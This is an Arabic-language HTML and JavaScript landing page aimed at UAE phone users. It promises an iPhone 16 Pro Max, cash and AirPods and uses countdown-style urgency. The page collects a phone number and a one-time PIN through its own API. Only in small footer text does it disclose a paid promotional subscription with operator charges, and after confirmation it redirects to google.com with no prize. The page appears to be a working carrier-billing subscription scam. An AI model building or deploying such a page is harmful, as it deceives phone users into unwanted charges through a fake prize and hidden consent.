<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>

<meta charset="UTF-8">

<meta
name="viewport"
content="width=device-width, initial-scale=1.0"
/>

<title>عرض الإمارات الحصري</title>

<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:'Cairo',sans-serif;
}

body{

    background:
    linear-gradient(
    180deg,
    #1b003b 0%,
    #2d006f 50%,
    #4b0082 100%
    );

    min-height:100vh;

    color:white;

    overflow-x:hidden;
}

.container{

    width:100%;
    max-width:500px;

    margin:auto;

    padding:20px;

    text-align:center;
}

.badge{

    display:inline-block;

    background:#ffde59;

    color:black;

    padding:10px 25px;

    border-radius:999px;

    font-size:18px;

    font-weight:900;

    margin-top:20px;

    animation:pulse 1.5s infinite;
}

@keyframes pulse{

    0%{
        transform:scale(1);
    }

    50%{
        transform:scale(1.05);
    }

    100%{
        transform:scale(1);
    }

}

h1{

    font-size:52px;

    line-height:1.2;

    margin-top:25px;

    font-weight:900;
}

.highlight{

    color:#ffde59;
}

.sub{

    margin-top:20px;

    font-size:24px;

    color:#ddd;

    line-height:1.5;
}

.gift{

    width:220px;

    margin-top:25px;

    animation:float 2s infinite ease-in-out;
}

@keyframes float{

    0%{
        transform:translateY(0px);
    }

    50%{
        transform:translateY(-15px);
    }

    100%{
        transform:translateY(0px);
    }

}

.prize-box{

    display:flex;

    gap:15px;

    margin-top:35px;

    justify-content:center;
}

.prize{

    flex:1;

    background:
    linear-gradient(
    135deg,
    #6d28d9,
    #9333ea
    );

    border:3px solid #ffde59;

    border-radius:20px;

    padding:18px 10px;

    font-size:22px;

    font-weight:900;

    box-shadow:
    0 0 20px rgba(255,222,89,.35);
}

.form-box{

    margin-top:40px;

    background:white;

    border-radius:30px;

    padding:30px 20px;

    box-shadow:
    0 0 40px rgba(0,0,0,.4);
}

.phone-box{

    display:flex;

    width:100%;

    background:#f3f4f6;

    border-radius:18px;

    overflow:hidden;

    border:2px solid #ddd;

    direction:ltr;

    margin-bottom:20px;
}

.prefix{

    width:95px;

    background:#e5e7eb;

    color:black;

    display:flex;

    align-items:center;

    justify-content:center;

    font-size:28px;

    font-weight:900;
}

.phone-box input{

    flex:1;

    border:none;

    outline:none;

    padding:22px;

    font-size:28px;

    color:black;
}

.claim-btn{

    width:100%;

    border:none;

    background:
    linear-gradient(
    90deg,
    #ffde59,
    #ffd000
    );

    color:black;

    font-size:34px;

    font-weight:900;

    padding:22px;

    border-radius:18px;

    cursor:pointer;

    transition:.2s;

    box-shadow:
    0 10px 30px rgba(255,222,89,.4);
}

.claim-btn:hover{

    transform:scale(1.02);
}

#loading{

    display:none;

    margin-top:20px;

    color:#7c3aed;

    font-size:22px;

    font-weight:bold;
}

.flash{

    margin-top:18px;

    color:#ffde59;

    font-size:18px;

    font-weight:bold;

    animation:blink 1s infinite;
}

@keyframes blink{

    0%{
        opacity:1;
    }

    50%{
        opacity:.4;
    }

    100%{
        opacity:1;
    }

}

#otpBox{

    display:none;

    margin-top:25px;
}

#otp{

    width:100%;

    padding:20px;

    border-radius:18px;

    border:2px solid #ddd;

    font-size:28px;

    margin-bottom:15px;

    text-align:center;
}

.verify-btn{

    width:100%;

    border:none;

    background:
    linear-gradient(
    90deg,
    #7c3aed,
    #9333ea
    );

    color:white;

    font-size:30px;

    font-weight:900;

    padding:20px;

    border-radius:18px;

    cursor:pointer;
}

.footer{

    margin-top:30px;

    color:#ddd;

    font-size:14px;

    line-height:1.6;
}

</style>

</head>

<body>

<div class="container">

<div class="badge">
🇦🇪 عرض حصري في الإمارات
</div>

<h1>
اربح <span class="highlight">آيفون 16 برو ماكس</span>
</h1>

<div class="sub">
أدخل رقم هاتفك الآن للدخول في السحب والفوز بجوائز مذهلة
</div>

<img
class="gift"
src="https://cdn-icons-png.flaticon.com/512/4213/4213958.png"
/>

<div class="prize-box">

<div class="prize">
آيفون 16
</div>

<div class="prize">
10,000 درهم
</div>

<div class="prize">
AirPods
</div>

</div>

<div class="form-box">

<div class="phone-box">

<div class="prefix">
+971
</div>

<input
id="msisdn"
placeholder="564975091"
maxlength="9"
inputmode="numeric"
pattern="[0-9]*"
oninput="this.value=this.value.replace(/[^0-9]/g,'')"
/>

</div>

<button
class="claim-btn"
onclick="sendPIN()"
>
اشترك الآن
</button>

<div id="loading">
جاري المعالجة...
</div>

<div class="flash">
⚡ عدد الفائزين محدود يومياً
</div>

<div id="otpBox">

<input
id="otp"
placeholder="أدخل رمز التحقق"
/>

<button
class="verify-btn"
onclick="verifyOTP()"
>
تأكيد الرمز
</button>

</div>

</div>

<div class="footer">

بالمتابعة، فإنك توافق على الاشتراك في الخدمات الترويجية.
قد يتم تطبيق رسوم المشغل.

</div>

</div>

<script>

let currentTxid = null;


// SEND PIN
async function sendPIN(){

    let msisdn =
    document.getElementById('msisdn').value;

    msisdn =
    msisdn.replace(/\s/g,'');

    msisdn =
    msisdn.replace('+','');

    if(msisdn.startsWith('0')){

        msisdn =
        '971' + msisdn.substring(1);

    }

    else if(!msisdn.startsWith('971')){

        msisdn =
        '971' + msisdn;

    }

    if(msisdn.length < 12){

        alert('يرجى إدخال رقم إماراتي صحيح');
        return;

    }

    document
    .getElementById('loading')
    .style.display='block';

    try{

        const response =
        await fetch('/api/send-pin',{

            method:'POST',

            headers:{
                'Content-Type':'application/json'
            },

            body:JSON.stringify({
                msisdn:msisdn
            })

        });

        const data =
        await response.json();

        console.log(data);

        document
        .getElementById('loading')
        .style.display='none';

        if(data.txid){

            currentTxid =
            data.txid;

            document
            .getElementById('otpBox')
            .style.display='block';

            alert('تم إرسال رمز التحقق بنجاح');

        }else{

            alert('حدث خطأ');

        }

    }catch(err){

        console.log(err);

        document
        .getElementById('loading')
        .style.display='none';

        alert('خطأ في النظام');

    }

}


// VERIFY OTP
async function verifyOTP(){

    const otp =
    document.getElementById('otp').value;

    if(!otp){

        alert('أدخل رمز التحقق');
        return;

    }

    try{

        const response =
        await fetch('/api/verify-pin',{

            method:'POST',

            headers:{
                'Content-Type':'application/json'
            },

            body:JSON.stringify({

                txid:currentTxid,

                pin:otp

            })

        });

        const data =
        await response.json();

        console.log(data);

        if(data.success){

            alert('تم الاشتراك بنجاح');

            window.location.href =
            'https://google.com';

        }else{

            alert('رمز التحقق غير صحيح');

        }

    }catch(err){

        console.log(err);

        alert('فشل التحقق');

    }

}

</script>

</body>
</html>
